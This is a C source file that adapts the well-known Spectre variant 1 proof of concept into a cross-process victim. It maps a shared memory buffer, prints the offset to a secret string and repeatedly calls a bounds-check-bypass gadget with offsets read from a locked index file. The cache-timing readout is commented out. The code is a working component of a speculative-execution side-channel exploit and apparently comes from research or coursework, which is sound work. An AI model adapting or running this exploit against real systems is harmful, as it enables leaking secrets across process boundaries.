#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <errno.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
int fd_lock;

unsigned int array1_size = 16;
uint8_t flushc[6000000];
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64]; 
uint8_t *array2;

char *secret = "The Magic Words are Squeamish Ossifrage.";
const char *lock_file_name = "spectre.lock";
const char *shared_memory_name = "shared_mem";
const char *index_file_name = "index.txt";

void victim_function(size_t x) {
	static uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */
	if (x < array1_size) {
		temp &= array2[array1[x] * 512];
	}
}


/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte() {
	/* static int results[256]; */
	/* int tries, i, j, k, mix_i; */
	/* unsigned junk = 0; */
	/* size_t training_x, x; */
	/* register uint64_t time1, time2; */
	/* volatile uint8_t *addr; */

	/* for (i = 0; i < 256; i++) */
	/* 	results[i] = 0; */
	/* for (tries = 999; tries > 0; tries--) { */

	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
	/* training_x = tries % array1_size; */
	/* for (j = 100; j >= 0; j--) { */
	/* 	_mm_clflush(&array1_size); */
	/* 	for (volatile int z = 0; z < 100; z++) {}  #<{(| Delay (can also mfence) |)}># */
  /*  */
	/* 	#<{(| Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 |)}># */
	/* 	#<{(| Avoid jumps in case those tip off the branch predictor |)}># */
	/* 	x = ((j % 6) - 1) & ~0xFFFF;   #<{(| Set x=FFF.FF0000 if j%6==0, else x=0 |)}># */
	/* 	x = (x | (x >> 16));           #<{(| Set x=-1 if j&6=0, else x=0 |)}># */
	/* 	x = training_x ^ (x & (malicious_x ^ training_x)); */
  /*  */
	/* 	#<{(| Call the victim! |)}># */
	/* 	victim_function(x); */
	/* } */
	/* } */
	/* for (j = 0; j < 16; ++j) { */
	/* 	_mm_clflush(&array1_size); */
	/* 	for (volatile int z = 0; z < 100; z++) {}  #<{(| Delay (can also mfence) |)}># */
	/* 	victim_function(j); */
	/* } */

	// acquire lock
	static int offset, locked;
	static size_t buffer[64], buffer_size = 64;

	// wait to appear
	while (access(index_file_name, F_OK) == -1);

	locked = -1;
	while (locked != 0) {
		fd_lock = open(lock_file_name, O_CREAT);
		locked = flock(fd_lock, LOCK_EX);
	}

	FILE *f = fopen(index_file_name, "r");
	if (f == NULL) {
		printf("nu exista offffff\n");
		exit(0);
	}

	int no_items;
	fscanf(f, "%d", &no_items);
	for (int i = 0; i < no_items; ++i) {
		fscanf(f, "%zu", &buffer[i]);
	}

	for (int i = 0; i < no_items; ++i) {
		_mm_clflush(&array1_size);
		for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
		victim_function(buffer[i]);
	}

	fclose(f);
	// remove file
	remove(index_file_name);

	// release lock
	unlink(lock_file_name);
	flock(fd_lock, LOCK_UN);
	close(fd_lock);
}

int main(int argc, const char **argv) {
	// map shared_file
	int fd = open(shared_memory_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	close(fd);

	if (array2 == MAP_FAILED) {
		printf("map failed %d", errno);
		return 0;
	}

	// output offset to secret for easiness
	size_t offset_to_secret = (size_t)(secret - (char*)array1);   /* default for malicious_x */
	printf("%zu\n", offset_to_secret);

	int i, score[2], offset;
	uint8_t value[2];

	/* if (argc == 2) { */
	/* 	sscanf(argv[1], "%d", &offset); */
	/* 	printf("given offset: %d\n", offset); */
	/* } else { */
	/* 	printf("Required argument: offset"); */
	/* 	return 0; */
	/* } */

	while (1) readMemoryByte();

	return 0;
}
